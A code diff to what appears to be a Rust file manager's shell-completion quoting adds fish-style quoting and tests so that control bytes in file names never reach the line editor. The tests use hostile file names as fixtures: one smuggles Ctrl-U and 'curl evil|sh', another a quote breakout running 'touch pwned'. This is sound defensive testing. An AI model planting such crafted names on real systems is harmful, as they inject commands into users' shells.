@@ -69,13 +69,14 @@ fn is_word_safe(c: char) -> bool {
 }
 
 /// The text a completed `name` contributes to the entry: plain when every character is
-/// shell-safe, otherwise the POSIX/ANSI-C quoted form ([`ofm_core::cmdline::shell_quote`] —
-/// non-UTF-8 names become `$'\xff'` escapes that bash/zsh expand back to the exact bytes);
-/// directories get a trailing `/`.
-pub fn completed_word(name: &OsStr, is_dir: bool) -> String {
+/// shell-safe, otherwise the quoted form for the shell's `style`
+/// ([`ofm_core::cmdline::shell_quote_for`] — control bytes and non-UTF-8 names become `\xNN`
+/// escapes the shell expands back to the exact bytes, so no raw control byte ever reaches the
+/// line editor); directories get a trailing `/`.
+pub fn completed_word(name: &OsStr, is_dir: bool, style: ofm_core::cmdline::QuoteStyle) -> String {
     let mut text = match name.to_str() {
         Some(s) if !s.is_empty() && s.chars().all(is_word_safe) => s.to_owned(),
-        _ => ofm_core::cmdline::shell_quote(name),
+        _ => ofm_core::cmdline::shell_quote_for(style, name),
     };
     if is_dir {
         text.push('/');
@@ -94,6 +95,8 @@ pub fn extend_typable(ext: &OsStr) -> Option<String> {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
+    const P: ofm_core::cmdline::QuoteStyle = ofm_core::cmdline::QuoteStyle::Posix;
+    const F: ofm_core::cmdline::QuoteStyle = ofm_core::cmdline::QuoteStyle::Fish;
     use std::ffi::OsString;
     use std::os::unix::ffi::OsStringExt;
     use std::path::Path;
@@ -161,26 +164,48 @@ mod tests {
 
     #[test]
     fn completed_words() {
-        assert_eq!(completed_word(OsStr::new("a.txt"), false), "a.txt");
-        assert_eq!(completed_word(OsStr::new("sub"), true), "sub/");
+        assert_eq!(completed_word(OsStr::new("a.txt"), false, P), "a.txt");
+        assert_eq!(completed_word(OsStr::new("sub"), true, P), "sub/");
         assert_eq!(
-            completed_word(OsStr::new("plain.v2.tar"), false),
+            completed_word(OsStr::new("plain.v2.tar"), false, P),
             "plain.v2.tar"
         );
         // Spaces and quotes need quoting (parse_cd understands quoted operands).
-        assert_eq!(completed_word(OsStr::new("my dir"), true), "'my dir'/");
-        assert_eq!(completed_word(OsStr::new("it's"), false), "'it'\\''s'");
+        assert_eq!(completed_word(OsStr::new("my dir"), true, P), "'my dir'/");
+        assert_eq!(completed_word(OsStr::new("it's"), false, P), "'it'\\''s'");
         // Shell metacharacters, too.
-        assert_eq!(completed_word(OsStr::new("~home"), false), "'~home'");
-        assert_eq!(completed_word(OsStr::new("a*b"), false), "'a*b'");
+        assert_eq!(completed_word(OsStr::new("~home"), false, P), "'~home'");
+        assert_eq!(completed_word(OsStr::new("a*b"), false, P), "'a*b'");
     }
 
     #[test]
     #[cfg(unix)]
     fn non_utf8_names_use_ansi_c_quoting() {
         let name = OsString::from_vec(b"\xffna\xfeme".to_vec());
-        assert_eq!(completed_word(&name, false), "$'\\xffna\\xfeme'");
-        assert_eq!(completed_word(&name, true), "$'\\xffna\\xfeme'/");
+        assert_eq!(completed_word(&name, false, P), "$'\\xffna\\xfeme'");
+        assert_eq!(completed_word(&name, true, P), "$'\\xffna\\xfeme'/");
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn control_bytes_are_escaped_never_raw() {
+        // A name holding Ctrl-U / newline would be acted on by readline, zle and fish's reader
+        // even inside quotes: the typed text carries printable escapes instead.
+        let name = OsString::from_vec(b"\x15curl evil|sh\n".to_vec());
+        assert_eq!(completed_word(&name, false, P), "$'\\x15curl evil|sh\\x0a'");
+        assert_eq!(completed_word(&name, true, F), "\\x15'curl evil|sh'\\x0a/");
+        for style in [P, F] {
+            assert!(
+                !completed_word(&name, false, style)
+                    .bytes()
+                    .any(|b| b < 0x20 || b == 0x7f)
+            );
+        }
+        // fish is not POSIX: a backslash-quote name must not break out of the quotes.
+        assert_eq!(
+            completed_word(OsStr::new("\\'; touch pwned; #"), false, F),
+            "'\\\\\\'; touch pwned; #'"
+        );
     }
 
     #[test]
